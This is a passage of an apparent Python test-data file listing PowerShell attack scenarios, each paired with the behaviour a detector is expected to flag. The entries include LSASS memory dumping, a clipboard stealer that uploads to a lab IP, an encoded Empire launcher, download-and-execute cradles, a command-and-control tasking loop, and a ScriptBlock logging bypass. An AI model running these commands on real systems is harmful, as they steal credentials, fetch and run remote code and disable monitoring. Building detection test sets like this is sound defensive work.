        "expected_behavior": "Interactive reverse shell on port 1337, continuous socket stream, IEX pipe.",
    },
    {
        "id": "rat-cred-harvest-lsass",
        "name": "Memory RAT - MiniDumpWriteDump Memory Harvester",
        "category": "Memory-Only RAT",
        "family_theme": "memory_only_rat",
        "description": "Extracts lsass.exe process memory snapshot directly using DbgHelp MiniDumpWriteDump.",
        "command": "powershell.exe -ep bypass -c \"$h = (Get-Process lsass).Handle; [DbgHelp]::MiniDumpWriteDump($h, (Get-Process lsass).Id, $pipeHandle, 2, 0, 0, 0)\"",
        "expected_behavior": "LSASS memory dumping attempt, high privilege flag, credential access vector.",
    },
    {
        "id": "rat-clipboard-monitor",
        "name": "Memory RAT - In-Memory Clipboard Monitor",
        "category": "Memory-Only RAT",
        "family_theme": "memory_only_rat",
        "description": "Hooks Windows clipboard notifications in memory to intercept copied passwords and tokens.",
        "command": "powershell.exe -nop -w hidden -c \"Add-Type -AssemblyName System.Windows.Forms; while($true){ $clip = [Windows.Forms.Clipboard]::GetText(); if($clip){ (New-Object Net.WebClient).UploadString('http://192.168.56.101:8080/clip', $clip) }; Start-Sleep -s 3 }\"",
        "expected_behavior": "Clipboard access loop, periodic HTTP outbound beaconing.",
    },

    # =========================================================================
    # 12. Empire Framework Launchers (5 scenarios)
    # =========================================================================
    {
        "id": "empire-launcher-base64",
        "name": "Empire Framework - Base64 Agent Launcher",
        "category": "Empire Framework",
        "family_theme": "empire_framework",
        "description": "Standard PowerShell Empire multi-stage agent launcher with UTF-16LE encoding.",
        "command": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHdjAC5IAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAKQA7AEkARQBYACAAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAwADEAOgA4ADAAOAAvAGwAYQB1AG4AYwBoAGUAcgAnACkA",
        "expected_behavior": "High Shannon entropy, Empire stager signature, execution bypass, hidden window.",
    },
    {
        "id": "empire-stager-negotiation",
        "name": "Empire Framework - Key Negotiation Stager",
        "category": "Empire Framework",
        "family_theme": "empire_framework",
        "description": "Empire stage 1 key negotiation stager sending encrypted AES session initialization packet.",
        "command": "powershell.exe -nop -w hidden -c \"$s='http://192.168.56.101:80/index.jsp'; $wc=New-Object Net.WebClient; $wc.Headers.Add('Cookie','session=STAGE1_INIT'); $data=$wc.DownloadData($s); [Empire.Crypto]::Decrypt($data) | IEX\"",
        "expected_behavior": "Cookie-based session token, custom user stager, reflective execution.",
    },
    {
        "id": "empire-tasking-beacon",
        "name": "Empire Framework - Dynamic Agent Tasking Loop",
        "category": "Empire Framework",
        "family_theme": "empire_framework",
        "description": "Continuous agent tasking loop executing downloaded scriptblocks and posting return output.",
        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"while($true){ $task=(Invoke-WebRequest 'http://10.10.14.5:8080/task').Content; if($task){ $out=IEX $task | Out-String; (New-Object Net.WebClient).UploadString('http://10.10.14.5:8080/results', $out) }; Start-Sleep -Seconds 5 }\"",
        "expected_behavior": "Continuous tasking loop, IEX execution, outbound POST results.",
    },
    {
        "id": "empire-mimikatz-module",
        "name": "Empire Framework - In-Memory Credential Dumper",
        "category": "Empire Framework",
        "family_theme": "empire_framework",
        "description": "Reflectively loads and executes memory credential dumping scriptblock in memory.",
        "command": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/DumpScript.ps1'); Invoke-DumpCreds\"",
        "expected_behavior": "Reflective credential dump execution, high handle risk, download cradle.",
    },
    {
        "id": "empire-bypass-reflection",
        "name": "Empire Framework - GroupPolicy & Logging Bypass",
        "category": "Empire Framework",
        "family_theme": "empire_framework",
        "description": "Empire unmanaged reflection stager patching ScriptBlock Logging buffers.",
        "command": "powershell.exe -ep bypass -w 1 -c \"[Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null,(New-Object 'System.Collections.Generic.Dictionary[string,System.Object]')); IEX((New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/stage2'))\"",
        "expected_behavior": "ScriptBlock logging bypass, reflection manipulation, download cradle.",
    },
]
